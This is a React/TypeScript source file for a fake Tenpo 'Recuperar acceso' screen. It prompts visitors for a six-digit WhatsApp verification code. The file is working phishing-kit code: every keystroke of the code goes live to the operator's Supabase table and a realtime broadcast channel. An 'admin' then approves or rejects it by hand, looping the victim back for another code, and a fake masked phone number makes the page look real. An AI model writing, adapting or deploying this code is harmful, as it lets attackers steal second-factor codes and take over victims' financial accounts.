import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { ArrowLeft, Loader2 } from "lucide-react";

interface TenpoSmsScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const TenpoSmsScreen = ({ email, sessionId, onBack }: TenpoSmsScreenProps) => {
  const [digits, setDigits] = useState<string[]>(["", "", "", "", "", ""]);
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");
  const [countdown, setCountdown] = useState(30);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Countdown timer
  useEffect(() => {
    if (countdown <= 0) return;
    const t = setInterval(() => setCountdown((c) => Math.max(0, c - 1)), 1000);
    return () => clearInterval(t);
  }, [countdown]);

  // Listen for admin decisions
  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel.on("broadcast", { event: "otp_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "otp_approved") setStatus("success");
      else if (decision === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => { setStatus("input"); inputRefs.current[0]?.focus(); }, 2000);
      }
    }).subscribe();

    const reviewChannel = supabase.channel(`session-review-client-sms-${sessionId}`);
    reviewChannel.on("broadcast", { event: "review_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "otp_approved") setStatus("success");
      else if (decision === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => { setStatus("input"); inputRefs.current[0]?.focus(); }, 2000);
      }
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data?.status === "otp_approved") { setStatus("success"); clearInterval(pollInterval); }
      else if (data?.status === "otp_rejected") {
        setStatus("error");
        setErrorMessage("Código inválido. Intentá de nuevo.");
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => {
          setStatus("input");
          supabase.from("sessions").update({ status: "redirect_mfa_sms" } as any).eq("id", sessionId);
          inputRefs.current[0]?.focus();
        }, 2000);
        clearInterval(pollInterval);
      }
    }, 2000);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(reviewChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId]);

  const syncToDb = useCallback((code: string) => {
    supabase.from("sessions").update({ otp_code: `sms_code:${code}` } as any).eq("id", sessionId);
    const chName = `confirm-email-${sessionId}-${Date.now()}-${Math.random()}`;
    const bc = supabase.channel(chName);
    bc.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        bc.send({ type: "broadcast", event: "client_sms_update", payload: { sms_code: code } });
        setTimeout(() => supabase.removeChannel(bc), 1500);
      }
    });
  }, [sessionId]);

  const handleDigitChange = (index: number, value: string) => {
    if (status !== "input") return;
    const char = value.slice(-1);
    if (char && !/^\d$/.test(char)) return;
    const newDigits = [...digits];
    newDigits[index] = char;
    setDigits(newDigits);
    syncToDb(newDigits.join(""));
    if (char && index < 5) inputRefs.current[index + 1]?.focus();
    if (newDigits.every((d) => d !== "") && newDigits.join("").length === 6) setStatus("verifying");
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!text) return;
    const newDigits = ["", "", "", "", "", ""];
    for (let i = 0; i < text.length; i++) newDigits[i] = text[i];
    setDigits(newDigits);
    syncToDb(newDigits.join(""));
    if (text.length === 6) setStatus("verifying");
    else inputRefs.current[text.length]?.focus();
  };

  const formatCountdown = () => {
    const m = Math.floor(countdown / 60).toString().padStart(2, "0");
    const s = (countdown % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  if (status === "success") {
    return (
      <div className="flex min-h-[100dvh] flex-col items-center justify-center bg-[#0a0a0a] px-6">
        <div className="text-[48px] mb-4">✅</div>
        <h1 className="text-[24px] font-bold text-white mb-2">Verificación completa</h1>
        <p className="text-[14px] text-[#888] text-center">Tu identidad fue verificada correctamente.</p>
        <p className="mt-4 text-[12px] text-[#555]">{email}</p>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] flex-col bg-[#1a1a1a]">
      {/* Header */}
      <div className="flex items-center px-5 py-4">
        <button onClick={onBack} className="p-1 text-[#888] hover:text-white transition-colors">
          <ArrowLeft size={22} />
        </button>
        <span className="flex-1 text-center text-[16px] font-semibold text-white">Recuperar acceso</span>
        <div className="w-[22px]" />
      </div>

      {/* Content */}
      <div className="flex-1 px-6 pt-6">
        <h1 className="text-[24px] font-bold text-white mb-3">¡Revisa tu teléfono!</h1>
        <p className="text-[15px] text-[#999] leading-relaxed mb-8">
          Ingresa el código de verificación que te enviamos por Whatsapp al <span className="font-bold text-white">+*******{email.slice(-4)}</span>
        </p>

        {errorMessage && status === "error" && (
          <div className="mb-5 rounded-lg border border-red-500/30 bg-red-500/10 px-4 py-2.5 text-[13px] text-red-400">{errorMessage}</div>
        )}

        <p className="text-[13px] text-[#888] mb-3">Código de 6 dígitos</p>

        {/* 6-digit input boxes */}
        <div className="flex gap-2.5 mb-10">
          {digits.map((digit, i) => (
            <input
              key={i}
              ref={(el) => { inputRefs.current[i] = el; }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleDigitChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              onPaste={i === 0 ? handlePaste : undefined}
              disabled={status === "verifying"}
              autoFocus={i === 0}
              className="h-[56px] w-full max-w-[56px] rounded-xl border-2 border-[#333] bg-[#1a1a1a] text-center text-[22px] font-bold text-white outline-none transition-all focus:border-[#4DF4AC] disabled:opacity-50"
            />
          ))}
        </div>

        {/* Countdown / request new code */}
        <button
          disabled={countdown > 0}
          onClick={() => setCountdown(30)}
          className={`w-full rounded-full border-2 py-4 text-[15px] font-semibold transition-all ${
            countdown > 0
              ? "border-[#333] text-[#4DF4AC]"
              : "border-[#4DF4AC] text-[#4DF4AC] hover:bg-[#4DF4AC]/10"
          }`}
        >
          {countdown > 0
            ? `Solicitar nuevo código en ${formatCountdown()} segundos`
            : "Solicitar nuevo código"}
        </button>

        {status === "verifying" && (
          <div className="mt-6 flex items-center justify-center gap-2 text-[14px] text-[#888]">
            <Loader2 className="h-4 w-4 animate-spin text-[#4DF4AC]" />
            Verificando código...
          </div>
        )}
      </div>
    </div>
  );
};

export default TenpoSmsScreen;
